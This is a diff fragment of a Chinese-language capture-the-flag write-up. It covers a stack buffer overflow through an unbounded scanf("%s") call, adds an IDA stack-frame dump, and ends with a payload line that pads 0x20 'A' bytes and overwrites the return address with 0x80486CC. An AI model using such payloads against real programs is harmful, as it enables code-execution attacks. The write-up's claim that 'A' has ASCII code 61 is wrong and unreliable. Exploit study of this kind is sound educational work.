@@ -44,5 +44,41 @@ IDA中F5查看第41行 __isoc99_scanf("%s", &v2);是脆弱点函数，但该函�
 代码中让函数sub_8048702(*((_BYTE *)&v2 + i))返回0
 因此v2的值需要在v2 > 96 && v2 <= 122 || v2 > 47 && v2 <= 57 || v2 == 95 || v2 == 45 || v2 == 43 || v2 == 46;的范围之外，我们发现A的ASCII码值为61，满足条件。
 
+
+栈结构如下：
+-00000074                 db ? ; undefined
+-00000073                 db ? ; undefined
+-00000072                 db ? ; undefined
+-00000071                 db ? ; undefined
+-00000070                 db ? ; undefined
+-0000006F                 db ? ; undefined
+-0000006E                 db ? ; undefined
+-0000006D                 db ? ; undefined
+-0000006C                 db ? ; undefined
+-0000006B                 db ? ; undefined
+-0000006A                 db ? ; undefined
+-00000069                 db ? ; undefined
+-00000068                 db ? ; undefined
+-00000067                 db ? ; undefined
+-00000066                 db ? ; undefined
+-00000065                 db ? ; undefined
+-00000064                 db ? ; undefined
+-00000063                 db ? ; undefined
+-00000062                 db ? ; undefined
+-00000061                 db ? ; undefined
+-00000060                 db ? ; undefined
+-0000005F                 db ? ; undefined
+-0000005E                 db ? ; undefined
+-0000005D                 db ? ; undefined
+-0000005C                 db ? ; undefined
+-0000005B                 db ? ; undefined
+-0000005A                 db ? ; undefined
+-00000059                 db ? ; undefined
+-00000058                 db ? ; undefined
+-00000057                 db ? ; undefined
+-00000056                 db ? ; undefined
+-00000055                 db ? ; undefined
+-00000054                 db ? ; undefined
+
 4）构造payload：
 payload='A'*(0x20)+p32(0x80486CC)
